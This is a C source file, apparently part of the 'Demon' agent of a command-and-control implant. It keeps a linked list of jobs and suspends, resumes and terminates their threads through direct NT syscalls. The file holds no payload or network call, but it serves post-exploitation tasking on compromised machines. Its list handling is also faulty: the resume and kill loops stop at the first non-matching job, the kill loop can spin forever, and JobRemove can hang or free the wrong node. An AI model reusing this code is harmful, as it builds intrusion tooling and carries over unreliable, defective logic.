#include <Demon.h>

#include <Core/Jobs.h>
#include <Core/Package.h>
#include <Core/MiniStd.h>

/*!
 * JobAdd
 * Adds a job to the job linked list
 * @param JobID
 * @param Type type of job: thread or process
 * @param State current state of the job: suspended or running
 * @return
 */
VOID JobAdd( DWORD JobID, SHORT Type, SHORT State, HANDLE Handle )
{
    PRINTF( "Add job => JobID:[%d] Type:[%d] State:[%d]", JobID, Type, State )

    PJOB_DATA JobList = NULL;
    PJOB_DATA Job     = NULL;

    Job = Instance->Win32.LocalAlloc( LPTR, sizeof( JOB_DATA ) );

    // fill the Job info and insert it into our linked list
    Job->JobID  = JobID;
    Job->Type   = Type;
    Job->State  = State;
    Job->Handle = Handle;
    Job->Next   = NULL;

    if ( Instance->Jobs == NULL )
    {
        Instance->Jobs = Job;
        return;
    }

    JobList = Instance->Jobs;

    do {
        if ( JobList )
        {
            if ( JobList->Next != NULL )
                JobList = JobList->Next;
            else
            {
                JobList->Next = Job;
                break;
            }
        } else
            break;

    } while ( TRUE );
}

/*!
 * JobSuspend
 * Suspends the specified job
 * @param JobID
 * @return
 */
BOOL JobSuspend( DWORD JobID )
{
    PJOB_DATA JobList = Instance->Jobs;

    do
    {
        if ( JobList )
        {
            if ( JobList->JobID == JobID )
            {
                PRINTF( "Found Job ID: %d", JobID )

                if ( JobList->Type == JOB_TYPE_THREAD )
                {
                    PUTS( "Suspending Thread" )
                    HANDLE   Handle   = JobList->Handle;
                    NTSTATUS NtStatus = STATUS_SUCCESS;

                    if ( Handle )
                    {
                        NtStatus = Instance->Syscall.NtSuspendThread( JobList->Handle, NULL );
                        if ( NT_SUCCESS( NtStatus ) )
                        {
                            JobList->State = JOB_STATE_SUSPENDED;
                            return TRUE;
                        }
                        else
                        {
                            return FALSE;
                        }
                    }
                    else
                    {
                        PUTS( "Handle is emtpy" )
                        return FALSE;
                    }
                }
            }
            else
            {
                JobList = JobList->Next;
            }
        }
        else
            break;
    } while ( TRUE );

    return FALSE;
}

/*!
 * JobSuspend
 * Suspends the specified job
 * @param JobID
 * @return
 */
BOOL JobResume( DWORD JobID )
{
    PJOB_DATA JobList = Instance->Jobs;

    do
    {
        if ( JobList )
        {
            if ( JobList->JobID == JobID )
            {
                PRINTF( "Found Job ID: %d", JobID )

                if ( JobList->Type == JOB_TYPE_THREAD )
                {
                    PUTS( "Resume Thread" )
                    HANDLE   Handle   = JobList->Handle;
                    NTSTATUS NtStatus = STATUS_SUCCESS;

                    if ( Handle )
                    {
                        NtStatus = Instance->Syscall.NtResumeThread( JobList->Handle, NULL );
                        if ( NT_SUCCESS( NtStatus ) )
                        {
                            JobList->State = JOB_STATE_RUNNING;
                            return TRUE;
                        }
                        else
                            return FALSE;
                    }
                    else
                    {
                        PUTS( "Handle is emtpy" )
                        return FALSE;
                    }
                }
            }
            else break;
        }
        else break;
    } while ( TRUE );

    return FALSE;
}

/*!
 * JobKill
 * Kills and remove the specified job
 * @param JobID
 * @return
 */
BOOL JobKill( DWORD JobID )
{
    PJOB_DATA JobList = Instance->Jobs;

    do {
        if ( ! JobList )
            break;

        if ( JobList->JobID == JobID )
        {
            PRINTF( "Found Job ID: %d\n", JobID )

            if ( JobList->Type == JOB_TYPE_THREAD )
            {
                PUTS( "Kill Thread" )
                HANDLE   Handle   = JobList->Handle;
                NTSTATUS NtStatus = STATUS_SUCCESS;

                if ( Handle )
                {
                    PUTS( "Kill using handle" )

                    if ( ! NT_SUCCESS( NtStatus = Instance->Syscall.NtTerminateThread( JobList->Handle, STATUS_SUCCESS ) ) )
                    {
                        PRINTF( "TerminateThread NtStatus:[%ul]\n", NtStatus )
                        NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
                        SEND_WIN32_BACK;
                        return FALSE;
                    }
                    else
                    {
                        // remove one thread from counter
                        Instance->Threads--;
                    }
                }
                else
                {
                    PUTS( "Handle is emtpy" )
                    return FALSE;
                }

                JobRemove( JobID );
            }
        }
        else break;
    } while ( TRUE );

    return TRUE;
}

/*!
 * JobRemove
 * Remove the specified job
 * @param ThreadID
 * @return
 */
VOID JobRemove( DWORD JobID )
{
    // Iterate over Job list and replace/remove job
    PRINTF( "Remove JobID: %d\n", JobID );
    PUTS( "Iterate over Job list and replace/remove job" )
    PJOB_DATA JobList    = Instance->Jobs;
    PJOB_DATA JobListTmp = NULL;

    if ( Instance->Jobs->JobID == JobID )
    {
        Instance->Jobs = JobList->Next;
    }
    else
    {
        JobListTmp = JobList;

        while ( TRUE )
        {
            PRINTF( "JobListTmp => %p == %p\n", JobListTmp, JobList )
            if ( JobListTmp )
            {
                if ( JobListTmp->Next == JobList )
                {
                    PUTS( "Found Job. Replace/Remove it from list" )
                    JobListTmp->Next = JobList->Next;
                    break;
                }
                else
                {
                    JobListTmp = JobListTmp->Next;
                }
            }
        }
    }

    MemSet( JobList, 0, sizeof( JOB_DATA ) );
    Instance->Win32.LocalFree( JobList );
    JobList = NULL;
}
